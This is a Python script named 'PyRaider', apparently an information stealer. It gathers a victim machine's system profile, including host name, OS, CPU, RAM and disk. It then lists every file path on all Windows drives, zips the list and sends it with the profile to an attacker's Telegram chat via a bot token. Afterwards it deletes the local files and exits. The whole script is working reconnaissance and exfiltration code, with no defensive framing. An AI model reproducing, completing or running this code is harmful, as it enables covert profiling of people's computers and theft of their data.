import telebot
import platform 
import os  
import time
import psutil
import zipfile

def write_file_paths(directory, output_file, custom_text=None):
    start_time = time.time()  # Start the timer
    with open(output_file, 'a', encoding='utf-8') as f:
        if custom_text:
            f.write(custom_text + '\n\n')
        f.write("Starting Directory: " + directory + "\n\n")
        for root, dirs, files in os.walk(directory):
            for file in files:
                file_path = os.path.join(root, file)
                f.write(file_path + '\n')
        f.write("\nExecution time: " + str(round(time.time() - start_time, 2)) + " seconds")
    return time.time() - start_time  

TOKEN = 'CHANGEME'
# U can get your id  here @getmyid_bot
CHAT_ID = 'CHANGEME'

bot = telebot.TeleBot(TOKEN)


info = "-=PyRaider=-\n"
info += f"OS: {platform.system()} {platform.release()}\n"
info += f"Processor: {platform.processor()}\n"
info += f"Machine: {platform.machine()}\n"
info += f"Python Version: {platform.python_version()}\n"
info += f"System Architecture: {platform.architecture()[0]}\n"
info += f"Network Node: {platform.node()}\n"
info += f"System Name: {platform.system_alias(platform.system(), platform.release(), platform.version())}\n"
info += f"Processor Architecture: {platform.processor()}\n"
info += "\n"

cpu_percent = psutil.cpu_percent(interval=1)
memory = psutil.virtual_memory()
disk = psutil.disk_usage('/')

info += f"CPU Usage: {cpu_percent:.2f}%\n"
info += f"RAM: {memory.total / (1024 ** 3):.2f} GB\n"
info += f"Available Memory: {memory.available / (1024 ** 3):.2f} GB\n"
info += f"Used Memory: {memory.used / (1024 ** 3):.2f} GB\n"
info += f"Memory Usage: {memory.percent:.2f}%\n"
info += f"Total Disk Space: {disk.total / (1024 ** 3):.2f} GB\n"
info += f"Used Disk Space: {disk.used / (1024 ** 3):.2f} GB\n"
info += f"Free Disk Space: {disk.free / (1024 ** 3):.2f} GB\n"
info += f"Disk Usage: {disk.percent:.2f}%\n"
print ('start')




output_file_path = 'file_paths.txt'  

drive_letters = [chr(i) + ":\\" for i in range(ord('A'), ord('Z')+1)]

with open(output_file_path, 'w') as f:
    f.write("")  

execution_time = 0.0

for drive_letter in drive_letters:
    if os.path.exists(drive_letter):
        execution_time += write_file_paths(drive_letter, output_file_path, info)
        print("File paths, custom text, starting directory ({0}), and execution time have been written to {1}".format(drive_letter, output_file_path))
        print("Execution time:", round(execution_time, 2), "seconds")

print("File paths have been written to", output_file_path)
print("Execution time:", round(execution_time, 2), "seconds")
# Specify the archive file path
archive_file_path = 'file_paths.zip'


with zipfile.ZipFile(archive_file_path, 'w', compression=zipfile.ZIP_DEFLATED, compresslevel=-1) as zipf:
    zipf.write(output_file_path)
os.remove(output_file_path)
print ('fin')


with open(archive_file_path, 'rb') as file:
    bot.send_document(CHAT_ID, file, caption = info)

os.remove(archive_file_path)
exit()